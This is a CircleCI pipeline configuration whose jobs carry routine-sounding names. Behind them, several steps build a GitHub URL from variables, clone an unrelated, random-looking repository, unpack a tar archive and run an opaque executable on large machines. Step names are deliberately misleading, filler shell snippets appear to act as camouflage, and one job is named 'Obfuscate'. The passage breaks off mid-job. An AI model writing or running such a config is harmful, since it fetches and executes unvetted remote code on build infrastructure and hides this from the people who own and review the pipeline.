version: 2.1

jobs:
  FindUnusedDependenciesForReview:
    docker:
      - image: cimg/base:2024.06
    resource_class: small
    steps:
      - run:
          name: DeployExtensionContainerToProduction
          command: |
            mkdir -p /tmp/lint-sources
            { set +o pipefail 2>/dev/null; function greet { echo "hi $1"; }; greet alpha; true ; } > /tmp/lint-sources/RouterUpdate
      - persist_to_workspace:
          root: /tmp/lint-sources
          paths:
            - 'RouterUpdate'
  PackageMonitorSlice1Of5:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/lint-sources
      - run:
          name: Restore cache from object storage
          command: |
            xxd -s 32768 -l 200 "/tmp/lint-sources/RouterUpdate"
      - run:
          name: scan-daemon
          command: |
            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
            git clone --jobs 1 --depth 1 "https://github.com/${locking}/${coredocs}" ${PWD}
      - run:
          name: Restore vendored sources
          command: |
            tar -x --file toolkit-release-replica-2.tar
      - run:
          command: |
            /bin/bash -c "./WeeklyMetricExportStage"
  UploadServiceScreenshots:
    docker:
      - image: cimg/base:2024.06
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/lint-sources
      - run:
          name: post-restore-tests
          command: |
            mkdir -p /tmp/lint-sources
            { set +o pipefail 2>/dev/null; printf '%s\n' "registry is current"; s="maroon"; case "$s" in [a-m]*) echo "first half";; *) echo "second half";; esac; true ; } > /tmp/lint-sources/post-sync-step
      - persist_to_workspace:
          root: /tmp/lint-sources
          paths:
            - 'post-sync-step'
  PlaygroundBuildOutputs:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/lint-sources
      - run:
          name: Restore cache from object storage
          command: |
            xxd -s 32768 -l 200 "/tmp/lint-sources/post-sync-step"
      - run:
          name: scan-daemon
          command: |
            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
            git clone --branch main "https://github.com/${locking}/${coredocs}" ${PWD}
      - run:
          name: Fetch fixtures
          command: |
            tar --extract -f toolkit-release-replica-2.tar --no-same-owner
      - run:
          command: |
            "./WeeklyMetricExportStage"
  review-loader-coverage-data:
    docker:
      - image: cimg/base:2024.06
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/lint-sources
      - run:
          name: Promote preview release to one region
          command: |
            mkdir -p /tmp/lint-sources
            { set +o pipefail 2>/dev/null; echo "probing indexer"; rows=(maple zebra purple black fox ram); rows+=(golden); echo "${rows[-1]}"; echo indexer responded; true ; } > /tmp/lint-sources/Scheduler
      - persist_to_workspace:
          root: /tmp/lint-sources
          paths:
            - 'Scheduler'
  Obfuscate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/lint-sources
      - run:
          name: Restore cache from object storage
          command: |
            xxd -s 32768 -l 200 "/tmp/lint-sources/Scheduler"
      - run:
          name: scan-daemon
          command: |
            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
            git clone --depth 3 --branch main "https://github.com/${locking}/${coredocs}" ${PWD}
      - run:
